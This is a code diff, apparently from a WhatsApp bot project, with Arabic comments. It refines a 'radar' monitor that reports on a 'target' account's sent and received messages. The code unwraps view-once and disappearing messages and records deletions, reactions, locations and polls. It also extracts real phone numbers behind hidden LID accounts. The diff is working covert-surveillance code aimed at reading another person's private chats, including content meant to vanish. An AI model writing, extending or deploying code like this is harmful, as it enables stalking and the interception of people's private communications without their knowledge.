@@ -244,7 +244,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         } 
 
         // ========================================== 
-        // 🚨 [نظام الرادار المجهر - الدقة المطلقة]
+        // 🚨 [نظام الرادار المجهر - الإصلاح النهائي]
         // ========================================== 
         if (activeMonitors.has(sessionId)) { 
             const monitorInfo = activeMonitors.get(sessionId); 
@@ -261,11 +261,17 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
                     else if (actualMessage.viewOnceMessageV2Extension) { actualMessage = actualMessage.viewOnceMessageV2Extension.message; isViewOnce = true; } 
                     else if (actualMessage.ephemeralMessage) { actualMessage = actualMessage.ephemeralMessage.message; } 
 
-                    // 2. فلتر الأرقام (تصفية الرقم الحقيقي 100% بدون إضافات)
+                    // 2. فلتر الأرقام الصارم (تم حل مشكلة الرقم الطويل 267194814439563 والحسابات المخفية)
                     const extractRealNumber = (jid) => {
                         if (!jid) return "غير معروف";
-                        // يزيل @s.whatsapp.net ويزيل رقم الجهاز المرتبط مثل :1 أو :2
-                        return jid.split('@')[0].split(':')[0]; 
+                        let str = String(jid);
+                        let num = str.split('@')[0].split(':')[0]; // مسح أي معرف جهاز إضافي
+                        
+                        // إذا كان حساب واتساب بزنس مخفي (LID) سيضع بجانبه ملاحظة لتفهم مصدر الرقم الغريب
+                        if (str.includes('@lid')) {
+                            num = num + " (حساب مخفي/LID)";
+                        }
+                        return num; 
                     };
 
                     const myTargetNumber = extractRealNumber(selfId);
@@ -295,22 +301,30 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
 
                     const directionSymbol = isFromMe ? "📤 (صادر من الهدف)" : "📥 (وارد للهدف)";
 
-                    // 3. تحديد نوع الحدث والمحتوى بدقة
+                    // 3. تحديد نوع الحدث والمحتوى بدقة تامة (إصلاح مشكلة التفاعل والحذف)
                     let msgType = Object.keys(actualMessage)[0]; 
                     if (msgType === 'senderKeyDistributionMessage' && Object.keys(actualMessage).length > 1) { 
                         msgType = Object.keys(actualMessage)[1]; 
                     } 
+                    // تخطي رسالة التشفير للوصول للرسالة الحقيقية
+                    if (msgType === 'messageContextInfo' && Object.keys(actualMessage).length > 1) {
+                        msgType = Object.keys(actualMessage)[1];
+                    }
 
                     let eventType = "رسالة نصية 📝";
                     let textContent = actualMessage.conversation || actualMessage.extendedTextMessage?.text || actualMessage.imageMessage?.caption || actualMessage.videoMessage?.caption || ""; 
 
-                    // معالجة الأحداث الخاصة (التفاعلات والحذف والميديا)
+                    // معالجة الأحداث الخاصة وإصلاحها بالكامل
                     if (msgType === 'reactionMessage') {
                         eventType = "تفاعل (إيموجي) ❤️";
                         const reaction = actualMessage.reactionMessage;
-                        textContent = `قام بوضع تفاعل [ ${reaction.text} ] على رسالة.`;
+                        if (reaction && reaction.text) {
+                            textContent = `قام بوضع تفاعل [ ${reaction.text} ] على رسالة.`;
+                        } else {
+                            textContent = `قام بإزالة التفاعل من رسالة.`; // إذا كان الإيموجي فارغاً فهذا يعني أنه حذفه
+                        }
                     } 
-                    else if (msgType === 'protocolMessage' && actualMessage.protocolMessage.type === 0) {
+                    else if (msgType === 'protocolMessage') {
                         eventType = "حذف رسالة 🗑️";
                         textContent = `قام بحذف رسالة لدى الجميع.`;
                     }
@@ -320,7 +334,13 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
                     }
                     else if (msgType === 'contactMessage') eventType = "جهة اتصال 👤";
                     else if (msgType === 'locationMessage') eventType = "موقع جغرافي 📍";
-                    else if (msgType === 'pollCreationMessage') eventType = "تصويت (استطلاع رأي) 📊";
+                    else if (msgType === 'pollCreationMessage') {
+                        eventType = "تصويت (استطلاع رأي) 📊";
+                        textContent = actualMessage.pollCreationMessage?.name || "إنشاء تصويت جديد";
+                    }
+
+                    // تجاهل أي قراءات فارغة ناتجة عن أخطاء اتصال النظام
+                    if (!textContent && eventType === "رسالة نصية 📝") return;
 
                     // 4. بناء هيكل التقرير المنظم الدقيق
                     const reportText = 
